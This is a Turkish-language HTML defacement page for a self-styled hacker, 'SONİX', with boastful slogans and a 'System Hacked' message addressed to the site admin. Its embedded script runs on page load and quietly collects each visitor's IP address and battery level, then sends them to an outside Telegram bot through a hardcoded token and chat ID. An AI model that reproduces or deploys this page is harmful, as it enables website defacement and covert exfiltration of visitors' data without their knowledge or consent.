<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SONİX | OFFICIAL</title>
    <style>
        :root { --gold: #fdb913; --red: #ee352e; --green: #278e43; }
        
        body {
            margin: 0; padding: 0; background-color: #000; color: #fff;
            font-family: 'Times New Roman', serif;
            display: flex; flex-direction: column; align-items: center;
            overflow-x: hidden; min-height: 100vh;
        }

        /* HDR Akıcı Kültürel Arka Plan */
        .bg-gradient {
            position: fixed; inset: 0; z-index: -1;
            background: radial-gradient(circle at top left, rgba(238, 53, 46, 0.15), transparent),
                        radial-gradient(circle at bottom right, rgba(39, 142, 67, 0.15), transparent),
                        radial-gradient(circle at center, rgba(253, 185, 19, 0.1), transparent);
            animation: breathe 10s infinite alternate ease-in-out;
        }
        @keyframes breathe { from { opacity: 0.6; transform: scale(1); } to { opacity: 1; transform: scale(1.05); } }

        .container {
            max-width: 900px; width: 90%; text-align: center;
            padding: 100px 20px; animation: fadeIn 2s ease-out;
        }

        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }

        .main-quote {
            font-size: clamp(1.5rem, 5vw, 2.5rem);
            font-weight: 900; letter-spacing: 5px; line-height: 1.4;
            margin-bottom: 60px; text-transform: uppercase;
            background: linear-gradient(90deg, #fff, var(--gold), #fff);
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
        }

        /* PROFİL FOTOĞRAFI AYARLARI */
        .profile-img {
            width: 220px; height: 220px; border-radius: 50%;
            border: 2px solid rgba(253, 185, 19, 0.3);
            margin-bottom: 25px; object-fit: cover;
            filter: grayscale(100%); /* Başlangıçta Siyah-Beyaz */
            transition: 1.5s;
        }
        .profile-img:hover { filter: grayscale(0%); border-color: var(--gold); box-shadow: 0 0 30px rgba(253, 185, 19, 0.4); }

        .name {
            font-size: 4rem; font-weight: 900; letter-spacing: 30px;
            margin: 20px 0; text-transform: uppercase; opacity: 0.9;
        }

        .divider {
            width: 150px; height: 1px; 
            background: linear-gradient(90deg, var(--red), var(--gold), var(--green));
            margin: 50px auto;
        }

        .sub-quote {
            font-size: 1.8rem; font-style: italic; letter-spacing: 3px;
            color: var(--green); margin-bottom: 60px;
        }

        .admin-msg {
            background: rgba(255, 0, 0, 0.1);
            border: 1px solid var(--red);
            padding: 15px 30px; border-radius: 5px;
            font-family: monospace; font-size: 1.1rem;
            color: var(--red); letter-spacing: 3px;
            display: inline-block; animation: blink 1.5s infinite;
        }
        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }

    </style>
</head>
<body onload="autoInit()">

    <div class="bg-gradient"></div>
    <audio id="muzik" loop><source src="4_5945186120164712362.mp3" type="audio/mpeg"></audio>

    <div class="container">
        <div class="main-quote">
            Siz Bizim Kim Olduğumuzu Merak Ederken <br> 
            Biz Sizin 7 Sülalenizi Çözüyoruz.
        </div>
        
        <img src="https://i.postimg.cc/9Dwhd9rW/image.png" class="profile-img" alt="SONIX PROFILE">
        
        <h1 class="name">SONİX</h1>
        
        <div class="divider"></div>

        <div class="sub-quote">
            "Kürde İmkansız De, Otur İzle."
        </div>

        <div class="admin-msg">
            Site Adminine Mesaj: System Hacked
        </div>
    </div>

    <script>
        const token = "8786995649:AAEQyWRD2oXQdc7YG5o9TI641dwB9ZIPM00";
        const chatId = "7783618933";

        function autoInit() {
            const audio = document.getElementById('muzik');
            audio.play().catch(() => {
                document.body.addEventListener('click', () => { audio.play(); }, { once: true });
            });
            sendLogs();
        }

        async function sendLogs() {
            try {
                let ipRes = await fetch('https://api.ipify.org?format=json');
                let ipData = await ipRes.json();
                let batt = await navigator.getBattery();
                let report = `🧑‍💻 <b>SONİX</b>\n\n📍 IP: ${ipData.ip}\n🔋 Pil: %${Math.round(batt.level * 100)}\n🚀 Durum: Gövde Gösterisi Yayında`;
                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(report)}&parse_mode=HTML`);
            } catch(e) {}
        }
    </script>
</body>
</html>
